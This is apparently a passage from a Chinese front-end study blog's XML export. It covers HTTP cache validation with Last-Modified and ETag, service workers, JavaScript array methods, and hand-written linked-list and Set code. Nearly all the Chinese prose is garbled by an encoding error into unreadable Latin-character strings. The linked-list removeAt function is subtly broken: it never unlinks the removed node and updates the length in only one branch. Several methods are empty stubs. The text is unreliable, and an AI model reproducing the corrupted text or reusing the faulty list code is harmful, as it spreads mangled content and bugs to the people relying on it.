ä¸­çš„å€¼ä¸ŽæœåŠ¡å™¨ä¸­è¿™ä¸ªèµ„æºçš„æœ€åŽä¿®æ”¹æ—¶é—´å¯¹æ¯”ï¼Œå¦‚æžœæ²¡æœ‰å˜åŒ–ï¼Œè¿”å›ž304å’Œç©ºçš„å“åº”ä½“ï¼Œç›´æŽ¥ä»Žç¼“å­˜è¯»å–ï¼Œå¦‚æžœIf-Modified-Sinceçš„æ—¶é—´å°äºŽæœåŠ¡å™¨ä¸­è¿™ä¸ªèµ„æºçš„æœ€åŽä¿®æ”¹æ—¶é—´ï¼Œè¯´æ˜Žæ–‡ä»¶æœ‰æ›´æ–°ï¼ŒäºŽæ˜¯è¿”å›žæ–°çš„èµ„æºæ–‡ä»¶å’Œ200 ä½†æ˜¯ Last-Modified å­˜åœ¨ä¸€äº›å¼Šç«¯ï¼š å¦‚æžœæœ¬åœ°æ‰“å¼€ç¼“å­˜æ–‡ä»¶ï¼Œå³ä½¿æ²¡æœ‰å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œä½†è¿˜æ˜¯ä¼šé€ æˆ Last-Modified è¢«ä¿®æ”¹ï¼ŒæœåŠ¡ç«¯ä¸èƒ½å‘½ä¸­ç¼“å­˜å¯¼è‡´å‘é€ç›¸åŒçš„èµ„æº å› ä¸º Last-Modified åªèƒ½ä»¥ç§’è®¡æ—¶ï¼Œå¦‚æžœåœ¨ä¸å¯æ„ŸçŸ¥çš„æ—¶é—´å†…ä¿®æ”¹å®Œæˆæ–‡ä»¶ï¼Œé‚£ä¹ˆæœåŠ¡ç«¯ä¼šè®¤ä¸ºèµ„æºè¿˜æ˜¯å‘½ä¸­äº†ï¼Œä¸ä¼šè¿”å›žæ­£ç¡®çš„èµ„æº æ—¢ç„¶æ ¹æ®æ–‡ä»¶ä¿®æ”¹æ—¶é—´æ¥å†³å®šæ˜¯å¦ç¼“å­˜å°šæœ‰ä¸è¶³ï¼Œèƒ½å¦å¯ä»¥ç›´æŽ¥æ ¹æ®æ–‡ä»¶å†…å®¹æ˜¯å¦ä¿®æ”¹æ¥å†³å®šç¼“å­˜ç­–ç•¥ï¼Ÿæ‰€ä»¥åœ¨ HTTP / 1.1 å‡ºçŽ°äº† ETagå’ŒIf-None-Match 2. ETagå’ŒIf-None-MatchEtagæ˜¯æœåŠ¡å™¨å“åº”è¯·æ±‚æ—¶ï¼Œè¿”å›žå½“å‰èµ„æºæ–‡ä»¶çš„ä¸€ä¸ªå”¯ä¸€æ ‡è¯†(ç”±æœåŠ¡å™¨ç”Ÿæˆ)ï¼Œåªè¦èµ„æºæœ‰å˜åŒ–ï¼ŒEtagå°±ä¼šé‡æ–°ç”Ÿæˆã€‚æµè§ˆå™¨åœ¨ä¸‹ä¸€æ¬¡åŠ è½½èµ„æºå‘æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œä¼šå°†ä¸Šä¸€æ¬¡è¿”å›žçš„Etagå€¼æ”¾åˆ°request headeré‡Œçš„If-None-Matché‡Œï¼ŒæœåŠ¡å™¨åªéœ€è¦æ¯”è¾ƒå®¢æˆ·ç«¯ä¼ æ¥çš„If-None-Matchè·Ÿè‡ªå·±æœåŠ¡å™¨ä¸Šè¯¥èµ„æºçš„ETagæ˜¯å¦ä¸€è‡´ï¼Œå°±èƒ½å¾ˆå¥½åœ°åˆ¤æ–­èµ„æºç›¸å¯¹å®¢æˆ·ç«¯è€Œè¨€æ˜¯å¦è¢«ä¿®æ”¹è¿‡äº†ã€‚å¦‚æžœæœåŠ¡å™¨å‘çŽ°ETagåŒ¹é…ä¸ä¸Šï¼Œé‚£ä¹ˆç›´æŽ¥ä»¥å¸¸è§„GET 200å›žåŒ…å½¢å¼å°†æ–°çš„èµ„æºï¼ˆå½“ç„¶ä¹ŸåŒ…æ‹¬äº†æ–°çš„ETagï¼‰å‘ç»™å®¢æˆ·ç«¯ï¼›å¦‚æžœETagæ˜¯ä¸€è‡´çš„ï¼Œåˆ™ç›´æŽ¥è¿”å›ž304çŸ¥ä¼šå®¢æˆ·ç«¯ç›´æŽ¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜å³å¯ã€‚ 3. ä¸¤è€…ä¹‹é—´å¯¹æ¯”ï¼š é¦–å…ˆåœ¨ç²¾ç¡®åº¦ä¸Šï¼ŒEtagè¦ä¼˜äºŽLast-Modifiedã€‚ Last-Modifiedçš„æ—¶é—´å•ä½æ˜¯ç§’ï¼Œå¦‚æžœæŸä¸ªæ–‡ä»¶åœ¨1ç§’å†…æ”¹å˜äº†å¤šæ¬¡ï¼Œé‚£ä¹ˆä»–ä»¬çš„Last-Modifiedå…¶å®žå¹¶æ²¡æœ‰ä½“çŽ°å‡ºæ¥ä¿®æ”¹ï¼Œä½†æ˜¯Etagæ¯æ¬¡éƒ½ä¼šæ”¹å˜ç¡®ä¿äº†ç²¾åº¦ï¼›å¦‚æžœæ˜¯è´Ÿè½½å‡è¡¡çš„æœåŠ¡å™¨ï¼Œå„ä¸ªæœåŠ¡å™¨ç”Ÿæˆçš„Last-Modifiedä¹Ÿæœ‰å¯èƒ½ä¸ä¸€è‡´ã€‚ ç¬¬äºŒåœ¨æ€§èƒ½ä¸Šï¼ŒEtagè¦é€ŠäºŽLast-Modifiedï¼Œæ¯•ç«ŸLast-Modifiedåªéœ€è¦è®°å½•æ—¶é—´ï¼Œè€ŒEtagéœ€è¦æœåŠ¡å™¨é€šè¿‡ç®—æ³•æ¥è®¡ç®—å‡ºä¸€ä¸ªhashå€¼ã€‚ ç¬¬ä¸‰åœ¨ä¼˜å…ˆçº§ä¸Šï¼ŒæœåŠ¡å™¨æ ¡éªŒä¼˜å…ˆè€ƒè™‘Etag ç¼“å­˜æœºåˆ¶å¼ºåˆ¶ç¼“å­˜ä¼˜å…ˆäºŽåå•†ç¼“å­˜è¿›è¡Œï¼Œè‹¥å¼ºåˆ¶ç¼“å­˜(Expireså’ŒCache-Control)ç”Ÿæ•ˆåˆ™ç›´æŽ¥ä½¿ç”¨ç¼“å­˜ï¼Œè‹¥ä¸ç”Ÿæ•ˆåˆ™è¿›è¡Œåå•†ç¼“å­˜(Last-Modified / If-Modified-Sinceå’ŒEtag / If-None-Match)ï¼Œåå•†ç¼“å­˜ç”±æœåŠ¡å™¨å†³å®šæ˜¯å¦ä½¿ç”¨ç¼“å­˜ï¼Œè‹¥åå•†ç¼“å­˜å¤±æ•ˆï¼Œé‚£ä¹ˆä»£è¡¨è¯¥è¯·æ±‚çš„ç¼“å­˜å¤±æ•ˆï¼Œè¿”å›ž200ï¼Œé‡æ–°è¿”å›žèµ„æºå’Œç¼“å­˜æ ‡è¯†ï¼Œå†å­˜å…¥æµè§ˆå™¨ç¼“å­˜ä¸­ï¼›ç”Ÿæ•ˆåˆ™è¿”å›ž304ï¼Œç»§ç»­ä½¿ç”¨ç¼“å­˜ã€‚å…·ä½“æµç¨‹å›¾å¦‚ä¸‹ï¼š çœ‹åˆ°è¿™é‡Œï¼Œä¸çŸ¥é“ä½ æ˜¯å¦å­˜åœ¨è¿™æ ·ä¸€ä¸ªç–‘é—®:å¦‚æžœä»€ä¹ˆç¼“å­˜ç­–ç•¥éƒ½æ²¡è®¾ç½®ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šæ€Žä¹ˆå¤„ç†ï¼Ÿ å¯¹äºŽè¿™ç§æƒ…å†µï¼Œæµè§ˆå™¨ä¼šé‡‡ç”¨ä¸€ä¸ªå¯å‘å¼çš„ç®—æ³•ï¼Œé€šå¸¸ä¼šå–å“åº”å¤´ä¸­çš„ Date å‡åŽ» Last-Modified å€¼çš„ 10% ä½œä¸ºç¼“å­˜æ—¶é—´ã€‚ å®žé™…åœºæ™¯åº”ç”¨ç¼“å­˜ç­–ç•¥1. é¢‘ç¹å˜åŠ¨çš„èµ„æº Cache-Control: no-cache å¯¹äºŽé¢‘ç¹å˜åŠ¨çš„èµ„æºï¼Œé¦–å…ˆéœ€è¦ä½¿ç”¨Cache-Control: no-cache ä½¿æµè§ˆå™¨æ¯æ¬¡éƒ½è¯·æ±‚æœåŠ¡å™¨ï¼Œç„¶åŽé…åˆ ETag æˆ–è€… Last-Modified æ¥éªŒè¯èµ„æºæ˜¯å¦æœ‰æ•ˆã€‚è¿™æ ·çš„åšæ³•è™½ç„¶ä¸èƒ½èŠ‚çœè¯·æ±‚æ•°é‡ï¼Œä½†æ˜¯èƒ½æ˜¾è‘—å‡å°‘å“åº”æ•°æ®å¤§å°ã€‚ 2. ä¸å¸¸å˜åŒ–çš„èµ„æº Cache-Control: max-age=31536000 é€šå¸¸åœ¨å¤„ç†è¿™ç±»èµ„æºæ—¶ï¼Œç»™å®ƒä»¬çš„ Cache-Control é…ç½®ä¸€ä¸ªå¾ˆå¤§çš„ max-age=31536000 (ä¸€å¹´)ï¼Œè¿™æ ·æµè§ˆå™¨ä¹‹åŽè¯·æ±‚ç›¸åŒçš„ URL ä¼šå‘½ä¸­å¼ºåˆ¶ç¼“å­˜ã€‚è€Œä¸ºäº†è§£å†³æ›´æ–°çš„é—®é¢˜ï¼Œå°±éœ€è¦åœ¨æ–‡ä»¶å(æˆ–è€…è·¯å¾„)ä¸­æ·»åŠ  hashï¼Œ ç‰ˆæœ¬å·ç­‰åŠ¨æ€å­—ç¬¦ï¼Œä¹‹åŽæ›´æ”¹åŠ¨æ€å­—ç¬¦ï¼Œä»Žè€Œè¾¾åˆ°æ›´æ”¹å¼•ç”¨ URL çš„ç›®çš„ï¼Œè®©ä¹‹å‰çš„å¼ºåˆ¶ç¼“å­˜å¤±æ•ˆ (å…¶å®žå¹¶æœªç«‹å³å¤±æ•ˆï¼Œåªæ˜¯ä¸å†ä½¿ç”¨äº†è€Œå·²)ã€‚åœ¨çº¿æä¾›çš„ç±»åº“ (å¦‚ jquery-3.3.1.min.js, lodash.min.js ç­‰) å‡é‡‡ç”¨è¿™ä¸ªæ¨¡å¼ã€‚ ç”¨æˆ·è¡Œä¸ºå¯¹æµè§ˆå™¨ç¼“å­˜çš„å½±å“æ‰€è°“ç”¨æˆ·è¡Œä¸ºå¯¹æµè§ˆå™¨ç¼“å­˜çš„å½±å“ï¼ŒæŒ‡çš„å°±æ˜¯ç”¨æˆ·åœ¨æµè§ˆå™¨å¦‚ä½•æ“ä½œæ—¶ï¼Œä¼šè§¦å‘æ€Žæ ·çš„ç¼“å­˜ç­–ç•¥ã€‚ä¸»è¦æœ‰ 3 ç§ï¼š æ‰“å¼€ç½‘é¡µï¼Œåœ°å€æ è¾“å…¥åœ°å€ï¼š æŸ¥æ‰¾ disk cache ä¸­æ˜¯å¦æœ‰åŒ¹é…ã€‚å¦‚æœ‰åˆ™ä½¿ç”¨ï¼›å¦‚æ²¡æœ‰åˆ™å‘é€ç½‘ç»œè¯·æ±‚ã€‚ æ™®é€šåˆ·æ–° (F5)ï¼šå› ä¸º TAB å¹¶æ²¡æœ‰å…³é—­ï¼Œå› æ­¤ memory cache æ˜¯å¯ç”¨çš„ï¼Œä¼šè¢«ä¼˜å…ˆä½¿ç”¨(å¦‚æžœåŒ¹é…çš„è¯)ã€‚å…¶æ¬¡æ‰æ˜¯ disk cacheã€‚ å¼ºåˆ¶åˆ·æ–° (Ctrl + F5)ï¼šæµè§ˆå™¨ä¸ä½¿ç”¨ç¼“å­˜ï¼Œå› æ­¤å‘é€çš„è¯·æ±‚å¤´éƒ¨å‡å¸¦æœ‰ Cache-control: no-cache(ä¸ºäº†å…¼å®¹ï¼Œè¿˜å¸¦äº† Pragma: no-cache),æœåŠ¡å™¨ç›´æŽ¥è¿”å›ž 200 å’Œæœ€æ–°å†…å®¹ã€‚ Service WorkerService workers æœ¬è´¨ä¸Šå……å½“Webåº”ç”¨ç¨‹åºä¸Žæµè§ˆå™¨ä¹‹é—´çš„ä»£ç†æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥åœ¨ç½‘ç»œå¯ç”¨æ—¶ä½œä¸ºæµè§ˆå™¨å’Œç½‘ç»œé—´çš„ä»£ç†ã€‚å®ƒä»¬æ—¨åœ¨ï¼ˆé™¤å…¶ä»–ä¹‹å¤–ï¼‰ä½¿å¾—èƒ½å¤Ÿåˆ›å»ºæœ‰æ•ˆçš„ç¦»çº¿ä½“éªŒï¼Œæ‹¦æˆªç½‘ç»œè¯·æ±‚å¹¶åŸºäºŽç½‘ç»œæ˜¯å¦å¯ç”¨ä»¥åŠæ›´æ–°çš„èµ„æºæ˜¯å¦é©»ç•™åœ¨æœåŠ¡å™¨ä¸Šæ¥é‡‡å–é€‚å½“çš„åŠ¨ä½œã€‚ä»–ä»¬è¿˜å…è®¸è®¿é—®æŽ¨é€é€šçŸ¥å’ŒåŽå°åŒæ­¥APIã€‚ æœåŠ¡å·¥ä½œçº¿ç¨‹æ¦‚å¿µå’Œç”¨æ³•èŠ‚Service workeræ˜¯ä¸€ä¸ªæ³¨å†Œåœ¨æŒ‡å®šæºå’Œè·¯å¾„ä¸‹çš„äº‹ä»¶é©±åŠ¨workerã€‚å®ƒé‡‡ç”¨JavaScriptæŽ§åˆ¶å…³è”çš„é¡µé¢æˆ–è€…ç½‘ç«™ï¼Œæ‹¦æˆªå¹¶ä¿®æ”¹è®¿é—®å’Œèµ„æºè¯·æ±‚ï¼Œç»†ç²’åº¦åœ°ç¼“å­˜èµ„æºã€‚ä½ å¯ä»¥å®Œå…¨æŽ§åˆ¶åº”ç”¨åœ¨ç‰¹å®šæƒ…å½¢ï¼ˆæœ€å¸¸è§çš„æƒ…å½¢æ˜¯ç½‘ç»œä¸å¯ç”¨ï¼‰ä¸‹çš„è¡¨çŽ°ã€‚ Service workerè¿è¡Œåœ¨workerä¸Šä¸‹æ–‡ï¼Œå› æ­¤å®ƒä¸èƒ½è®¿é—®DOMã€‚ç›¸å¯¹äºŽé©±åŠ¨åº”ç”¨çš„ä¸»JavaScriptçº¿ç¨‹ï¼Œå®ƒè¿è¡Œåœ¨å…¶ä»–çº¿ç¨‹ä¸­ï¼Œæ‰€ä»¥ä¸ä¼šé€ æˆé˜»å¡žã€‚å®ƒè®¾è®¡ä¸ºå®Œå…¨å¼‚æ­¥ï¼ŒåŒæ­¥APIï¼ˆå¦‚XHRå’ŒlocalStorageï¼‰ä¸èƒ½åœ¨service workerä¸­ä½¿ç”¨ã€‚ å‡ºäºŽå®‰å…¨è€ƒé‡ï¼ŒService workersåªèƒ½ç”±HTTPSæ‰¿è½½ï¼Œæ¯•ç«Ÿä¿®æ”¹ç½‘ç»œè¯·æ±‚çš„èƒ½åŠ›æš´éœ²ç»™ä¸­é—´äººæ”»å‡»ä¼šéžå¸¸å±é™©ã€‚åœ¨Firefoxæµè§ˆå™¨çš„ç”¨æˆ·éšç§æ¨¡å¼ï¼ŒService Workerä¸å¯ç”¨ã€‚ ä½¿ç”¨ ServiceWorkerContainer.register() æ–¹æ³•é¦–æ¬¡æ³¨å†Œservice workerã€‚å¦‚æžœæ³¨å†ŒæˆåŠŸï¼Œservice workerå°±ä¼šè¢«ä¸‹è½½åˆ°å®¢æˆ·ç«¯å¹¶å°è¯•å®‰è£…æˆ–æ¿€æ´»ï¼ˆè§ä¸‹æ–‡ï¼‰ï¼Œè¿™å°†ä½œç”¨äºŽæ•´ä¸ªåŸŸå†…ç”¨æˆ·å¯è®¿é—®çš„URLï¼Œæˆ–è€…å…¶ç‰¹å®šå­é›†ã€‚ ä¸‹è½½ã€å®‰è£…å’Œæ¿€æ´»æ­¤æ—¶ï¼Œä½ çš„æœåŠ¡å·¥ä½œè€…(service worker)å°†éµå®ˆä»¥ä¸‹ç”Ÿå‘½å‘¨æœŸï¼š ä¸‹è½½ å®‰è£… æ¿€æ´» ç”¨æˆ·é¦–æ¬¡è®¿é—®service workeræŽ§åˆ¶çš„ç½‘ç«™æˆ–é¡µé¢æ—¶ï¼Œservice workerä¼šç«‹åˆ»è¢«ä¸‹è½½ã€‚ ä¹‹åŽè‡³å°‘æ¯24å°æ—¶å®ƒä¼šè¢«ä¸‹è½½ä¸€æ¬¡ã€‚å®ƒå¯èƒ½è¢«æ›´é¢‘ç¹åœ°ä¸‹è½½ï¼Œä¸è¿‡æ¯24å°æ—¶ä¸€å®šä¼šè¢«ä¸‹è½½ä¸€æ¬¡ï¼Œä»¥é¿å…ä¸è‰¯è„šæœ¬é•¿æ—¶é—´ç”Ÿæ•ˆã€‚ Service workersä¹Ÿå¯ä»¥ç”¨æ¥åšè¿™äº›äº‹æƒ…ï¼š åŽå°æ•°æ®åŒæ­¥ å“åº”æ¥è‡ªå…¶å®ƒæºçš„èµ„æºè¯·æ±‚ é›†ä¸­æŽ¥æ”¶è®¡ç®—æˆæœ¬é«˜çš„æ•°æ®æ›´æ–°ï¼Œæ¯”å¦‚åœ°ç†ä½ç½®å’Œé™€èžºä»ªä¿¡æ¯ï¼Œè¿™æ ·å¤šä¸ªé¡µé¢å°±å¯ä»¥åˆ©ç”¨åŒä¸€ç»„æ•°æ® åœ¨å®¢æˆ·ç«¯è¿›è¡ŒCoffeeScriptï¼ŒLESSï¼ŒCJS/AMDç­‰æ¨¡å—ç¼–è¯‘å’Œä¾èµ–ç®¡ç†ï¼ˆç”¨äºŽå¼€å‘ç›®çš„ï¼‰ åŽå°æœåŠ¡é’©å­ è‡ªå®šä¹‰æ¨¡æ¿ç”¨äºŽç‰¹å®šURLæ¨¡å¼ æ€§èƒ½å¢žå¼ºï¼Œæ¯”å¦‚é¢„å–ç”¨æˆ·å¯èƒ½éœ€è¦çš„èµ„æºï¼Œæ¯”å¦‚ç›¸å†Œä¸­çš„åŽé¢æ•°å¼ å›¾ç‰‡ æœªæ¥service workersèƒ½å¤Ÿç”¨æ¥åšæ›´å¤šä½¿webå¹³å°æŽ¥è¿‘åŽŸç”Ÿåº”ç”¨çš„äº‹ã€‚ å€¼å¾—å…³æ³¨çš„æ˜¯ï¼Œå…¶ä»–æ ‡å‡†ä¹Ÿèƒ½å¹¶ä¸”å°†ä¼šä½¿ç”¨service workerï¼Œä¾‹å¦‚: åŽå°åŒæ­¥ï¼šå¯åŠ¨ä¸€ä¸ªservice workerå³ä½¿æ²¡æœ‰ç”¨æˆ·è®¿é—®ç‰¹å®šç«™ç‚¹ï¼Œä¹Ÿå¯ä»¥æ›´æ–°ç¼“å­˜ å“åº”æŽ¨é€ï¼šå¯åŠ¨ä¸€ä¸ªservice workerå‘ç”¨æˆ·å‘é€ä¸€æ¡ä¿¡æ¯é€šçŸ¥æ–°çš„å†…å®¹å¯ç”¨ å¯¹æ—¶é—´æˆ–æ—¥æœŸä½œå‡ºå“åº” è¿›å…¥åœ°ç†å›´æ  https://zhuanlan.zhihu.com/p/47407398https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/ https://zhuanlan.zhihu.com/p/54314093 https://zhuanlan.zhihu.com/p/61704951 https://zhuanlan.zhihu.com/p/62168010]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ æŒ‡å—</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å­¦ä¹ æŒ‡å—_ç®—æ³•]]></title>
    <url>%2F2019%2F06%2F03%2Finterview_algorithm%2F</url>
    <content type="text"><![CDATA[å‰è¨€ å‰ç«¯é¢è¯•æŒ‡å—_ç®—æ³•æ•°æ®ç»“æž„æ•°ç»„JSçš„Arrayæ˜¯ä¸€ä¸ªä¸‡èƒ½çš„æ•°æ®ç»“æž„ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿå› ä¸ºé¦–å…ˆå®ƒå¯ä»¥å½“ä½œä¸€ä¸ªæ™®é€šçš„æ•°ç»„æ¥ä½¿ç”¨ï¼Œå³é€šè¿‡ä¸‹æ ‡æ‰¾åˆ°æ•°ç»„çš„å…ƒç´  ç„¶åŽå®ƒå¯ä»¥å½“ä½œä¸€ä¸ªæ ˆæ¥ä½¿ç”¨ï¼Œæˆ‘ä»¬çŸ¥é“æ ˆçš„ç‰¹ç‚¹æ˜¯å…ˆè¿›åŽå‡ºï¼Œæ ˆçš„åŸºæœ¬æ“ä½œæ˜¯å‡ºæ ˆå’Œå…¥æ ˆ åŒæ—¶å®ƒè¿˜å¯ä»¥å½“ä½œä¸€ä¸ªé˜Ÿåˆ—ï¼Œé˜Ÿåˆ—çš„ç‰¹ç‚¹æ˜¯å…ˆè¿›å…ˆå‡ºï¼ŒåŸºæœ¬æ“ä½œæ˜¯å‡ºé˜Ÿå’Œå…¥é˜Ÿ ç”šè‡³å®ƒè¿˜å¯ä»¥å½“ä½œä¸€ä¸ªå“ˆå¸Œè¡¨æ¥ä½¿ç”¨(ä½†æ˜¯ä¸æŽ¨èè¿™ä¹ˆç”¨) æºç é‡Œé¢è¯´ï¼ŒJSArrayæœ‰ä¸¤ç§æ¨¡å¼ï¼Œä¸€ç§æ˜¯å¿«é€Ÿçš„ï¼Œä¸€ç§æ˜¯æ…¢é€Ÿçš„ï¼Œå¿«é€Ÿçš„ç”¨çš„æ˜¯ç´¢å¼•ç›´æŽ¥å®šä½ï¼Œæ…¢é€Ÿçš„ä½¿ç”¨ç”¨å“ˆå¸ŒæŸ¥æ‰¾ JSArrayæ˜¯ç»§æ‰¿äºŽJSObject å¢žpush unshift splice åˆ pop shift splice æŸ¥arr[i] indexOf lastIndexOf includes find findIndex 12345arr.find(callback(element,index,array)[, thisArg])findæ–¹æ³•å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹å…ƒç´ æ‰§è¡Œä¸€æ¬¡ callback å‡½æ•°ï¼Œç›´è‡³æœ‰ä¸€ä¸ª callback è¿”å›ž trueã€‚å½“æ‰¾åˆ°äº†è¿™æ ·ä¸€ä¸ªå…ƒç´ åŽï¼Œè¯¥æ–¹æ³•ä¼šç«‹å³è¿”å›žè¿™ä¸ªå…ƒç´ çš„å€¼ï¼Œå¦åˆ™è¿”å›ž undefinedã€‚æ³¨æ„ callback å‡½æ•°ä¼šä¸ºæ•°ç»„ä¸­çš„æ¯ä¸ªç´¢å¼•è°ƒç”¨å³ä»Ž 0 åˆ° length - 1ï¼Œè€Œä¸ä»…ä»…æ˜¯é‚£äº›è¢«èµ‹å€¼çš„ç´¢å¼•ï¼Œè¿™æ„å‘³ç€å¯¹äºŽç¨€ç–æ•°ç»„æ¥è¯´ï¼Œè¯¥æ–¹æ³•çš„æ•ˆçŽ‡è¦ä½ŽäºŽé‚£äº›åªéåŽ†æœ‰å€¼çš„ç´¢å¼•çš„æ–¹æ³•ã€‚findæ–¹æ³•ä¸ä¼šæ”¹å˜æ•°ç»„ã€‚callbackå‡½æ•°å¸¦æœ‰3ä¸ªå‚æ•°ï¼šå½“å‰å…ƒç´ çš„å€¼ã€å½“å‰å…ƒç´ çš„ç´¢å¼•ï¼Œä»¥åŠæ•°ç»„æœ¬èº«ã€‚findIndex() æ–¹æ³•ï¼Œå®ƒè¿”å›žæ•°ç»„ä¸­æ‰¾åˆ°çš„å…ƒç´ çš„ç´¢å¼•ï¼Œè€Œä¸æ˜¯å…¶å€¼ã€‚ æ”¹concat join reverse slice sort 1234567891011arr.sort([compareFunction()])numbers.sort((a, b) =&gt; a - b); ä»Žå°åˆ°å¤§sortæ–¹æ³•ç”¨åŽŸåœ°ç®—æ³•å¯¹æ•°ç»„çš„å…ƒç´ è¿›è¡ŒæŽ’åºï¼Œå¹¶è¿”å›žæ•°ç»„ã€‚æŽ’åºç®—æ³•çŽ°åœ¨æ˜¯ç¨³å®šçš„ã€‚é»˜è®¤æŽ’åºé¡ºåºæ˜¯æ ¹æ®å­—ç¬¦ä¸²Unicodeç ç‚¹ã€‚å¿«é€ŸæŽ’åºå’Œä¼˜åŒ–çš„å½’å¹¶æŽ’åºå¿«é€ŸæŽ’åºä¸»è¦æ˜¯å¯¹å“ªäº›åŸºæœ¬ç±»åž‹æ•°æ®ï¼ˆint,short,longç­‰ï¼‰æŽ’åºï¼Œ è€Œåˆå¹¶æŽ’åºç”¨äºŽå¯¹å¯¹è±¡ç±»åž‹è¿›è¡ŒæŽ’åºã€‚ä½¿ç”¨ä¸åŒç±»åž‹çš„æŽ’åºç®—æ³•ä¸»è¦æ˜¯ç”±äºŽå¿«é€ŸæŽ’åºæ˜¯ä¸ç¨³å®šçš„ï¼Œè€Œåˆå¹¶æŽ’åºæ˜¯ç¨³å®šçš„å½’å¹¶æŽ’åºç›¸å¯¹è€Œè¨€æ¯”è¾ƒæ¬¡æ•°æ¯”å¿«é€ŸæŽ’åºå°‘ï¼Œç§»åŠ¨ï¼ˆå¯¹è±¡å¼•ç”¨çš„ç§»åŠ¨ï¼‰æ¬¡æ•°æ¯”å¿«é€ŸæŽ’åºå¤šï¼Œè€Œå¯¹äºŽå¯¹è±¡æ¥è¯´ï¼Œæ¯”è¾ƒä¸€èˆ¬æ¯”ç§»åŠ¨è€—æ—¶ã€‚è¡¥å……ä¸€ç‚¹åˆå¹¶æŽ’åºçš„æ—¶é—´å¤æ‚åº¦æ˜¯nlogn, å¿«é€ŸæŽ’åºçš„å¹³å‡æ—¶é—´å¤æ‚åº¦ä¹Ÿæ˜¯nlognï¼Œä½†æ˜¯åˆå¹¶æŽ’åºçš„éœ€è¦é¢å¤–çš„nä¸ªå¼•ç”¨çš„ç©ºé—´ã€‚å½“å¾…æŽ’åºçš„æ•°ç»„ä¸­çš„å…ƒç´ ä¸ªæ•°è¾ƒå°‘æ—¶ï¼Œæºç ä¸­çš„é˜€å€¼ä¸º7ï¼Œé‡‡ç”¨çš„æ˜¯æ’å…¥æŽ’åºã€‚å°½ç®¡æ’å…¥æŽ’åºçš„æ—¶é—´å¤æ‚åº¦ä¸º0(n^2)ï¼Œä½†æ˜¯å½“æ•°ç»„å…ƒç´ è¾ƒå°‘æ—¶ï¼Œæ’å…¥æŽ’åºä¼˜äºŽå¿«é€ŸæŽ’åºï¼Œå› ä¸ºè¿™æ—¶å¿«é€ŸæŽ’åºçš„é€’å½’æ“ä½œå½±å“æ€§èƒ½ã€‚ è¿­ä»£å™¨every somefilter reduce map forEach 12345678910111213141516171819202122every() æ–¹æ³•æµ‹è¯•ä¸€ä¸ªæ•°ç»„å†…çš„æ‰€æœ‰å…ƒç´ æ˜¯å¦éƒ½èƒ½é€šè¿‡æŸä¸ªæŒ‡å®šå‡½æ•°çš„æµ‹è¯•ã€‚å®ƒè¿”å›žä¸€ä¸ªå¸ƒå°”å€¼ã€‚numbers.every((a) =&gt; a&gt;10)some() æ–¹æ³•æµ‹è¯•æ˜¯å¦è‡³å°‘æœ‰ä¸€ä¸ªå…ƒç´ å¯ä»¥é€šè¿‡è¢«æä¾›çš„å‡½æ•°æ–¹æ³•ã€‚è¯¥æ–¹æ³•è¿”å›žä¸€ä¸ªBooleanç±»åž‹çš„å€¼ã€‚arr.some(callback(element[, index[, array]])[, thisArg])filter() æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„, å…¶åŒ…å«é€šè¿‡æ‰€æä¾›å‡½æ•°å®žçŽ°çš„æµ‹è¯•çš„æ‰€æœ‰å…ƒç´ ã€‚var newArray = arr.filter(callback(element[, index[, array]])[, thisArg])reduce() æ–¹æ³•å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ æ‰§è¡Œä¸€ä¸ªç”±æ‚¨æä¾›çš„reducerå‡½æ•°(å‡åºæ‰§è¡Œ)ï¼Œå°†å…¶ç»“æžœæ±‡æ€»ä¸ºå•ä¸ªè¿”å›žå€¼ã€‚arr.reduce(callback(accumulator, currentValue[, index[, array]])[, initialValue])numbers.reduce(function(accumulator, currentValue, currentIndex, array)&#123; return accumulator + currentValue;&#125;);map() æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ï¼Œå…¶ç»“æžœæ˜¯è¯¥æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½è°ƒç”¨ä¸€ä¸ªæä¾›çš„å‡½æ•°åŽè¿”å›žçš„ç»“æžœã€‚var new_array = arr.map(function callback(currentValue[, index[, array]]) &#123; // Return element for new_array &#125;[, thisArg])forEach() æ–¹æ³•å¯¹æ•°ç»„çš„æ¯ä¸ªå…ƒç´ æ‰§è¡Œä¸€æ¬¡æä¾›çš„å‡½æ•°ã€‚arr.forEach(callback[, thisArg]); é“¾è¡¨(æœªå®Œ)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function LinkedList()&#123; let Node = function(element)&#123; this.element = element; this.next = null; &#125; let length = 0; let head = null; this.append = function(element)&#123; let node = new Node(element),current; if(head === null)&#123; head = node; &#125;else&#123; current = head; while(current.next)&#123; current = current.next &#125; current.next = node; &#125; length++; &#125; this.insert = function(position,element)&#123; &#125; this.removeAt = function(position)&#123; if(position &gt; -1 &amp;&amp; position &lt; length)&#123; let current = head,previous,index=0; if(position === 0)&#123; head = current.next; &#125;else&#123; while(index++&lt;position)&#123; previous = current; current = current.next; &#125; length--; return current.element; &#125; &#125;else&#123; return null; &#125; &#125; this.remove = function(element)&#123;&#125; this.indexOf = function(element)&#123;&#125; this.isEmpty = function()&#123;&#125; this.size = function()&#123;&#125; this.getHead = function()&#123;&#125; this.toString = function()&#123; let current = head,string=&quot;&quot;; while(current)&#123; string+=current.element+(current.next?&quot; &quot;:&quot;&quot;); current=current.next &#125; return string &#125; this.print = function()&#123; return head &#125; &#125; é›†åˆä¸€ç»„æ— åºä¸”å”¯ä¸€çš„é¡¹æž„æˆï¼Œé”®å€¼ç›¸åŒ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768function Set()&#123; let items = &#123;&#125; this.has = function(value)&#123; return items.hasOwnProperty(value); &#125; this.add = function(value)&#123; 